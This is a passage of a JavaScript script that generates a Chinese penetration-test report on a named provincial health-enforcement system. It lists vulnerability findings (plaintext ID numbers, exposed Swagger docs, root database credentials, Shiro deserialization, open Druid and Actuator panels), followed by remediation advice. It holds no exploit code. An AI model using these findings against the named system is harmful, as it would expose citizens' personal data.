pc.push(h2("2. 身份证号明文存储与传输（严重）"));
pc.push(bullet("2,251条用户记录中身份证号完整明文存储"));
pc.push(bullet("SSO响应直接返回管理员身份证号，未脱敏"));
pc.push(bullet("违反《个人信息保护法》相关规定"));
pc.push(empty());
pc.push(h2("3. API文档对外暴露（高危）"));
pc.push(bullet("Knife4j Swagger UI（/doc.html）可公开访问"));
pc.push(bullet("/v2/api-docs 返回436个接口的完整定义"));
pc.push(empty());
pc.push(h2("4. 缺少API级别权限控制（高危）"));
pc.push(bullet("同一Token可访问全部业务模块"));
pc.push(bullet("未实现最小权限原则，无IP/设备指纹绑定"));
pc.push(empty());
pc.push(h2("5. 数据库凭据管理不当（高危）"));
pc.push(bullet("数据库使用root账户"));
pc.push(bullet("密码MD5可通过API直接读取"));
pc.push(empty());
pc.push(h2("6. 其他安全风险"));
pc.push(bullet("Shiro RememberMe反序列化：框架确认，WAF部分防护"));
pc.push(bullet("Actuator端点泄露内网IP"));
pc.push(bullet("Druid面板对外暴露"));
pc.push(bullet("isTest=0：测试模式与实际环境不一致"));
pc.push(new Paragraph({ children: [new PageBreak()] }));

// ============================================================
// SECTION 5: RECOMMENDATIONS
// ============================================================
const rc = [];
rc.push(h1("五、整改建议"));
rc.push(empty());
rc.push(h2("1. 修复SSO认证逻辑（紧急）"));
rc.push(bullet("SSO接口增加密码验证"));
rc.push(bullet("统一 /sys/mobile/login 和 /sys/loginsinglesign 认证标准"));
rc.push(empty());
rc.push(h2("2. 身份证号保护（紧急）"));
rc.push(bullet("数据库存储使用AES/SM4加密"));
rc.push(bullet("传输层脱敏（仅显示前4位和后2位）"));
rc.push(bullet("SSO响应中移除身份证号字段"));
rc.push(empty());
rc.push(h2("3. 关闭API文档对外访问"));
rc.push(bullet("生产环境: knife4j.production: true"));
rc.push(bullet("或对 /doc.html、/v2/api-docs 增加IP白名单"));
rc.push(empty());
rc.push(h2("4. 加强API权限管控"));
rc.push(bullet("实施RBAC细粒度权限"));
rc.push(bullet("Token增加IP绑定"));
rc.push(bullet("敏感操作增加二次认证"));
rc.push(empty());
rc.push(h2("5. 数据库安全加固"));
rc.push(bullet("禁用root，使用最小权限专用账户"));
rc.push(bullet("密码使用bcrypt/argon2加盐"));
rc.push(bullet("API不返回密码字段"));
rc.push(empty());
rc.push(h2("6. 其他"));
rc.push(bullet("升级Shiro至最新版本，更换AES密钥"));
rc.push(bullet("Actuator仅允许内网访问或完全关闭"));
rc.push(bullet("Druid面板IP白名单"));
rc.push(bullet("修正isTest配置"));
rc.push(empty()); rc.push(empty());
rc.push(body("报告生成日期：2026年7月14日"));
rc.push(body("测试团队：观叶识微"));
rc.push(body("测试工具：Python3、curl、Java(URLDNS)、ysoserial"));

// ============================================================
// BUILD
// ============================================================
const doc = new Document({
  styles: {
    default: { document: { run: { font: "Arial", size: 20 } } },
    paragraphStyles: [
      { id: "Heading1", name: "Heading 1", basedOn: "Normal", next: "Normal", quickFormat: true,
        run: { size: 32, bold: true, font: "Arial", color: "1A3A6B" },
        paragraph: { spacing: { before: 360, after: 200 }, outlineLevel: 0 } },
      { id: "Heading2", name: "Heading 2", basedOn: "Normal", next: "Normal", quickFormat: true,
        run: { size: 28, bold: true, font: "Arial", color: "2B579A" },
        paragraph: { spacing: { before: 280, after: 160 }, outlineLevel: 1 } },
      { id: "Heading3", name: "Heading 3", basedOn: "Normal", next: "Normal", quickFormat: true,
        run: { size: 24, bold: true, font: "Arial", color: "333333" },
        paragraph: { spacing: { before: 200, after: 120 }, outlineLevel: 2 } },
    ]
  },
  numbering: {
    config: [
      { reference: "b",
        levels: [{ level: 0, format: LevelFormat.BULLET, text: "•", alignment: AlignmentType.LEFT,
          style: { paragraph: { indent: { left: 720, hanging: 360 } } } }] },
    ]
  },
  sections: [
    section(cover), section(ov), section(fc), section(pc), section(rc)
  ]
});

const outPath = "D:/Desktop/claude projects/attack and defend test/广西卫生监督执法系统_攻防成果报告.docx";
Packer.toBuffer(doc).then(buf => {
  fs.writeFileSync(outPath, buf);
  console.log("OK: " + outPath + " (" + buf.length + " bytes)");
}).catch(e => console.error("ERR:", e));
